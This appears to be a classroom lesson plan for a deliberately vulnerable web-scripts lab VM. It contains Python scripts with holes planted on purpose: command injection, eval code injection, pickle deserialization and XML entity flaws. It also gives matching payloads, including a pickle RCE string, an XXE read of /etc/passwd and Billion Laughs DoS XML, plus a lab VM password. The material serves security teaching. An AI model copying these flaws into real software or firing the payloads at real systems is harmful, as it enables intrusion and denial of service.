# Cyber Lesson

## Goal

This lesson explains how and why developers are at the center of cybersecurity.

### Question for students

1. Where are the vulnerabilities ?
    - Everywhere (OS, Web Applications, Web Pages, Scripts, Applications, ...).
2. How are they created ?
    - They are introduced during implementation.
3. Who developed the vulnerabilities ? "who did the implementation?"
    - Developers
4. Why are they implemented ?
    - Work overload (they don't have enough time to develop with good practices to meet the need of production) (moui. bon. excuse facile. le vrai problème, ce sont les priorités)
    - Developers are not trained in cybersecurity
    - The complexity of production can cause bugs that are difficult to identify in development (formulation bizarre. tout est complexe. les bugs difficiles à identifier lors du dev, c'est toujours)
    - There are no safety advisories issued during project design (par qui?)
    - ...

## The VM configuration

**Do not use this part, it's useful to know how to debug, to add something or how it's work**.

### VM administration

*NAT* -> *Advanced* -> *Port forwarding* -> *Add* -> *Rule 1*, *127.0.0.1*, *2222*, , *22*.
                                                     *Rule 2*, *127.0.0.1*, *8008*, , *4443*.

**SSH is not enabled**, from the console, connect to `ssh -p 2222 kali@127.0.0.1`, password: `2VPNpgFzyq7xo9`.

```xml
<Network>
    <Adapter slot="0" enabled="true" MACAddress="0800279D6EE1" type="82540EM">
        <DisabledModes>
            <InternalNetwork name="intnet"/>
            <HostOnlyInterface name="VirtualBox Host-Only Ethernet Adapter"/>
            <NATNetwork name="NatNetwork"/>
        </DisabledModes>
        <NAT>
            <Forwarding name="Rule 1" proto="1" hostip="127.0.0.1" hostport="2222" guestport="22"/>
            <Forwarding name="Rule 2" proto="1" hostip="127.0.0.1" hostport="8008" guestport="4443"/>
        </NAT>
    </Adapter>
</Network>
```

#### Docker

```Dockerfile
FROM mauricelambert/webscripts

RUN rm -f /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/config/server.json
COPY server.json /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/config/

RUN rm -f /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/config/scripts/default_*.json
COPY vulns.json /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/config/scripts/

COPY check_up.py /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/
COPY fileshare.py /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/
COPY num_usages.py /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/
COPY password_manager.py /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/
COPY xml_counter.py /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/
COPY xml_to_html.py /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/
COPY .credentials /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/

RUN python3 /usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/account/change_user_password.py 2 Adm1n
```

```bash
docker build -t weakwebscripts .

docker run --restart always -p 4443:443/tcp --mount type=volume,source=apache_webscripts_data,target=/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/data --name WeakWebScripts -d weakwebscripts

docker exec -it WeakWebScripts /bin/bash
```

#### Upload on SourceForge

```bash
scp CyberLesson.zip mauricelambert@frs.sourceforge.net:/home/frs/project/bts-sio-slam-cyberintervention/VM.zip
``` 

### Vulnerable scripts

#### CheckUp

Vulnerability: *Command Injection*
Payload: (IP address) *[ip] | [exploit]*

```python
from sys import argv, exit, stderr
from os import system, name

if len(argv) == 2:
    ip = argv[1].replace(";", "").replace("&", "").replace("\n", "")
else:
    print("USAGES: python3 check_up.py <target ip or hostname>", file="stderr")
    exit(1)

if name == "nt":
    option = "-n"
    arp_command = f'arp -a | findstr "{ip}"'
else:
    option = "-c"
    arp_command = f'cat /proc/net/arp | grep "{ip}"'

system(f"ping {option} 1 {ip}")

if system(arp_command):
    print(ip, "is down.")
    exit(2)
else :
    print(ip, "is up.")
    exit(0)
```

#### File Share

Vulnerability: *python code injection*
Payload: (argument 1) *lambda: [exploit]*

```python
from os.path import join, dirname, basename
from sys import exit, stderr, argv, stdin
from os import listdir, remove
from base64 import b64decode

def getfilepath(filename):
    return join(dirname(__file__), basename(filename))

def read():
    if len(argv) != 3:
        print("USAGES: fileshare.py read <file>", file=stderr)
        return 1
    print(open(getfilepath(argv[2]), encoding="latin-1").read())
    return 0

def write():
    if len(argv) != 3:
        print("USAGES: fileshare.py write <file>", file=stderr)
        return 1
    open(getfilepath(argv[2]), "wb").write(b64decode(stdin.buffer.read()))
    return 0

def add():
    if len(argv) != 3:
        print("USAGES: fileshare.py add <file>", file=stderr)
        return 1
    open(getfilepath(argv[2]), "ab").write(b64decode(stdin.buffer.read()))
    return 0

def delete():
    if len(argv) != 3:
        print("USAGES: fileshare.py delete <file>", file=stderr)
        return 1
    remove(getfilepath(argv[2]))
    return 0

def list():
    for filename in listdir(getfilepath("")):
        if not filename.endswith(".py") and not filename.startswith("."):
            print(filename)
    return 0

if len(argv) < 2:
    print("USAGES: fileshare.py (list | [read|write|add|delete] [file])", file=stderr)
    exit(1)

try:
    exit(eval(argv[1])())
except:
    exit(127)
```

#### Basic numbers usages

Vulnerability: *python code injection*
Payload: *python3 num_usages.py exec "\_\_import\_\_('os').system('[exploit]')"*

```python
from sys import argv, exit, stderr

if len(argv) < 3:
    print("USAGES: python3 num_usages.py [max|min|sorted|sum] [value1] [value2] [valueN] ...", file=stderr)
    exit(1)

if argv[1] in ("sorted", "sum"):
    print(getattr(__builtins__, argv[1])((int(x) for x in argv[2:])))
else:
    print(getattr(__builtins__, argv[1])(*argv[2:]))

exit(0)
```

#### Password Manager

Vulnerability: *Unsecure deserialization*, *CSV Injection*
Payload: `base64(b"cos\nsystem\np0\n(VEXPLOIT\np1\ntp2\nRp3\n.")` -> *Y29zCnN5c3RlbQpwMAooVmVjaG8gUkNFCnAxCnRwMgpScDMKLg==* or upload a file with b'cos\nsystem\np0\n(Vecho RCE\np1\ntp2\nRp3\n.'.

```python
from base64 import b64encode, b64decode
from sys import stdin, exit
from pickle import loads
from hashlib import md5

class Key:
    def __init__(self, password):
        self.key = md5(password).digest()
        self.length = 16

class Reader:
    def __init__(self, position = None, username = None):
        self.filter = partial(lambda u, p, l, c, v: p == v, position) if position is not None else partial(lambda u, p, l, c, v: p == v, username) # wtf?

    def get_password(self):
        with open(Credentials.filename) as file:
            for line in file:
                line = [word.strip() for word in line.split(',', 3)]
                if self.filter(*line):
                    credentials = Credentials(*line)
                    credentials.password = credentials.uncipher()
                    return credentials

class Credentials:

    filename = "credentials.csv"

    def __init__(self, username, password, url = "", comment = ""):
        self.username = username
        self.password = password.encode()
        self.url = url
        self.comment = comment

    def encode_decode(self):
        return b64encode(self._cipher()).decode()

    def uncipher(self):
        self.password = b64decode(self.password.encode())
        return self._cipher().decode()

    def _cipher(self):
        return bytes(char ^ key.key[i % key.length] for i, char in enumerate(self.password))

    def save(self):
        with open(self.filename, "a") as file:
            file.write(f"{self.username},{self.encode_decode()},{self.url},{self.comment}\n")

key = Key(b"")
object_ = loads(b64decode(stdin.buffer.read()))

if object_.__class__.__name__ == "Key":
    key = object_
    print("The key has been updated")
elif object_.__class__.__name__ == "Credentials":
    credentials = object_
    credentials.save()
    print("The credentials are saved")
elif object_.__class__.__name__ == "Reader":
    reader = object_
    credentials = reader.get_password()
    print(credentials.username, credentials.password, credentials.url, credentials.comment, sep="\n")

exit(0)
```

#### XML Counter

Attack: *XML External Entity attack*.

```python
from xml.parsers.expat import ParserCreate, XML_PARAM_ENTITY_PARSING_ALWAYS, ExpatError
from collections import Counter, defaultdict
from urllib.request import urlopen
from base64 import b64decode
from sys import stdin, exit
from json import dumps

class ParentCounter(Counter):
    def __init__(self):
        self.is_parent = False
        super().__init__()

def start_element(name, attrs):
    counters[name]["attributes"] = len(attrs)
    counters[name][name] += 1

    for counter in counters.values():
        if counter.is_parent:
            counter["child"] += 1

    counters[name].is_parent = True

def end_element(name):
    counters[name].is_parent = False

def ExternalEntityRefHandler(context, _1, url, _2):
    subparser = p.ExternalEntityParserCreate(context, 'utf-8')
    print(urlopen(url).read().decode())
    return 1

p = ParserCreate(encoding="UTF-8")
p.ExternalEntityRefHandler = ExternalEntityRefHandler

p.StartElementHandler = start_element
p.EndElementHandler = end_element

p.SetParamEntityParsing(XML_PARAM_ENTITY_PARSING_ALWAYS)

counters = defaultdict(ParentCounter)

try:
    p.Parse(b64decode(stdin.read()), True)
except ExpatError as error:
    if not error.args[0].startswith("limit on input amplification factor (from DTD and entities) breached"):
        raise error
    print("DOS attack... I'm dead !")
    exit(127)

print(dumps({k: v.__dict__ for k, v in counters.items()}, indent=4))
exit(0)
```

Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root isroot="yes"><test isroot="no">&xxe;</test></root>
```

#### XML to HTML

Attack: *Billion Laughs*, *Quadratic Blowup*, potential *XSS* in stderr.

```python
from xml.etree.ElementTree import fromstring, ParseError
from sys import stdin, exit, stderr
from base64 import b64decode
from string import Template
from re import fullmatch
from html import escape

example = """<?xml version="1.0"?>
<document>
    <text>
        <data>Hello World !</data>
        <color>#FFFFFF</color>
        <type>h1</type>
    </text>
    <text>
        <data>Build a simple web page with XML !</data>
        <color>#FFFFFF</color>
        <type>p</type>
    </text>
</document>"""

output = Template("""
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>My Web Page !</title>

        <style>
            body {
                font-family: "'14px/1.3 Avenir',Helvetica,Arial,sans-serif";
                backgroud-color: #efefef;
            }
            div {
                margin-right: 25%;
                margin-left: 25%;
                margin-top: 25px;
                background-color: #ababab;
                border: 1px solid #222222;
                border-radius: 10px;
                padding: 25px;
            }
        </style>
    </head>
    <body>
        <div>
            ${data}
        </div>
    </body>
</html>
""")

data = ""

color = "#FFFFFF"
text = "Hello World !"
type_ = "p"

try:
    root = fromstring(b64decode(stdin.read()).decode())
except ParseError as error:
    print(error)
    if error.args[0].startswith("no element found:"):
        print("Incorrect XML, example:", example)
        exit(1)
    if error.args[0].startswith("limit on input amplification factor (from DTD and entities) breached"):
        print("DOS attack... I'm dead !")
        exit(127)
    raise error

# root = tree.getroot()

for child in root:
    if child.tag == "text":
        for subchild in child:
            if subchild.tag == "color":
                if fullmatch(r"#[A-Fa-f\d]{6}", subchild.text):
                    color = subchild.text
                else:
                    print('<p color="#FF0000" style="color: #ff0000">Incorrect color !</p>', file=stderr)
                    exit(2)
            elif subchild.tag == "data":
                text = escape(subchild.text)
            elif subchild.tag == "type":
                if fullmatch(r"\w+", subchild.text):
                    type_ = subchild.text
                else:
                    print('<p color="#FF0000" style="color: #ff0000">Incorrect type !</p>', file=stderr)
                    exit(3)
        data += f'<{type_} style="color: {color};">{text}</{type_}>\n            '

print(output.safe_substitute(data=data))

exit(0)
```

Payloads:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

```python
f'''<?xml version="1.0"?>
<!DOCTYPE DoS [
  <!ENTITY x "{'A' * 9999999}">
]>
<DoS>{'&x;' * 9999999}</DoS>'''
```

#### WebScripts Configuration

##### Server

```json
{
    "server": {
        "interface": "127.0.0.1",
        "port": 8000,

        "debug": false,
        "security": true,
        
        "accept_unknow_user": true,
        "accept_unauthenticated_user": true,
        "active_auth": true,
        "auth_script": "auth.py",
        "auth_failures_to_blacklist": 3,
        "blacklist_time": 30,
        "admin_groups": [1000],
        "exclude_auth_paths": ["/static/", "/js/"],
        "exclude_auth_pages": ["/api/", "/auth/", "/web/auth/"],
        "session_max_time": 3600,
        "csrf_max_time": 300,

        "scripts_path": [
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/vulnerabilities/",
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/scripts/account/"
        ],
        "json_scripts_config": [
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/config/scripts/vulns.json"
        ],
        "ini_scripts_config": [],
        "documentations_path": [],
        "modules": ["error_pages"],
        "modules_path": ["/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/modules/"],
        "js_path": [
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/static/js/*.js"
        ],
        "statics_path": [
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/static/html/*.html", 
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/static/css/*.css", 
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/static/images/*.png", 
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/static/images/*.jpg", 
            "/usr/src/WebScripts/lib/python3.9/site-packages/WebScripts/static/pdf/*.pdf"
        ],

        "log_level": "0",
        "log_filename": "/usr/src/WebScripts/logs/root.logs",
        "log_format": "%(asctime)s %(levelname)s %(message)s (%(funcName)s -> %(filename)s:%(lineno)d)",
        "log_date_format": "%d/%m/%Y %H:%M:%S",
        "log_encoding": "utf-8",

        "smtp_server": null,
        "smtp_starttls": false,
        "smtp_password": null,
        "smtp_port": 25,
        "smtp_ssl": false,
        "admin_adresses": [
            "admin1@webscripts.local",
            "admin2@webscripts.local"
        ],
        "notification_address": "notification@webscripts.local"
    },

    "scripts": {
        "auth.py": "config_auth"
    },

    "config_auth": {
        "timeout": 15,
        "args": "auth_args",
        "launcher": "python3",
        "category": "My Account",
        "description": "This script authenticates users."
    },

    "auth_args": {
        "--username": "arg_username",
        "--password": "arg_password"
    },

    "arg_password": {
        "example": "password",
        "html_type": "password",
        "description": "Your password (to log in)"
    },

    "arg_username": {
        "example": "user",
        "description": "Your username (to log in)"
    }
}
```

##### Scripts

```json
{
    "scripts": {
        "check_up.py": "config_check_up",
        "fileshare.py": "config_fileshare",
        "num_usages.py": "config_num_usages",
        "xml_counter.py": "config_xml_counter",
        "xml_to_html.py": "config_xml_to_html",
        "password_manager.py": "config_password_manager"
    },

    "config_check_up": {
        "timeout": 10,
        "no_password": true,
        "launcher": "python3",
        "category": "Network",
        "access_users": [0, 1, 2],
        "content_type": "text/plain",
        "args": "config_check_up_args",
        "description": "This script checks host is up."
    },

    "config_check_up_args": {
        "host": "arg_host"
    },

    "arg_host": {
        "example": "192.168.56.1",
        "description": "Host (IP or Netbios name) to check is up."
    },

    "config_fileshare": {
        "timeout": 10,
        "no_password": true,
        "category": "Share",
        "launcher": "python3",
        "access_users": [0, 1, 2],
        "content_type": "text/plain",
        "args": "config_fileshare_args",
        "description": "This script shares files content."
    },

    "config_fileshare_args": {
        "action": "arg_action1",
        "filename": "arg_filename",
        "filecontent": "arg_filecontent"
    },

    "arg_action1": {
        "predefined_values": ["list", "read", "write", "add", "delete"],
        "description": "Action to perform."
    },

    "arg_filename": {
        "example": "file.txt",
        "description": "Filename to read, write, add or delete content (unused with 'list' action)."
    },

    "arg_filecontent": {
        "input": true,
        "html_type": "file"
    },

    "config_num_usages": {
        "timeout": 10,
        "no_password": true,
        "launcher": "python3",
        "access_users": [0, 1, 2],
        "category": "Miscellaneous",
        "content_type": "text/plain",
        "args": "config_num_usages_args",
        "description": "Simple script used to sort, get the min, max, or sum of numbers."
    },

    "config_num_usages_args": {
        "action": "arg_action",
        "numbers": "arg_numbers"
    },

    "arg_action": {
        "predefined_values": ["max", "min", "sum", "sorted"],
        "description": "Action to perform."
    },

    "arg_numbers": {
        "list": true,
        "example": "123",
        "html_type": "number",
        "description": "Numbers to use."
    },

    "config_password_manager": {
        "timeout": 10,
        "no_password": true,
        "launcher": "python3",
        "category": "Passwords",
        "access_users": [0, 1, 2],
        "content_type": "text/plain",
        "args": "config_password_manager_args",
        "description": "This script stores and reads ciphered passwords"
    },

    "config_password_manager_args": {
        "data": "arg_filescontent"
    },

    "arg_filescontent": {
        "list": true,
        "input": true,
        "html_type": "file"
    },

    "config_xml_counter": {
        "timeout": 10,
        "category": "XML",
        "no_password": true,
        "launcher": "python3",
        "access_users": [0, 1, 2],
        "content_type": "text/plain",
        "args": "config_xml_counter_args",
        "description": "This script counts XML elements types, childs and attributes."
    },

    "config_xml_counter_args": {
        "xml_document": "arg_filecontent"
    },

    "config_xml_to_html": {
        "timeout": 10,
        "category": "XML",
        "no_password": true,
        "launcher": "python3",
        "access_users": [0, 1, 2],
        "content_type": "text/plain",
        "args": "config_xml_to_html_args",
        "stderr_content_type": "text/html",
        "description": "This script generates a basic HTML page from XML file."
    },

    "config_xml_to_html_args": {
        "xml_document": "arg_filecontent"
    }
}
```

## Practice/Exploitation

### Student

Start the VM `CyberLesson` and open your web browser on `127.0.0.1:8008`.

Find 6 vulnerabilities. Help other students once every 5 minutes (15 minutes per vulnerabilities -> 3 helps per vulnerabilities). Total 90 minutes.

### Examples in real life

 1. Log4Shell (default Java logging framework with RCE introduced in 2013 and discovered in 2021 - Deserialization of Untrusted Data), similar to pickle vulnerability.
 2. Spring4Shell (popular Java Web framework with RCE discovered in 2021 - Improper Control of Generation of Code), similar to `num_usage.py` vulnerability.
 3. ...

## How to reduce security issues

 - Training developers in cybersecurity
     - know, apply and enforce good practices
     - DON'T REINVENT THE WHEEL. Use secure primitives. DO. NOT. EVER. IMPLEMENT. A. CRYPTO. FUNCTION (only people to whom the words "side channel attack" should consider it, if anything because they'll know why and how it's a bad idea)
     - read the documentation
     - all inputs must be cleaned and checked
 - Security by design
 - SAST/DAST scans (with CI/CD)
 - Tests (unittests, pentests, bug bounty, ...)
 - ...
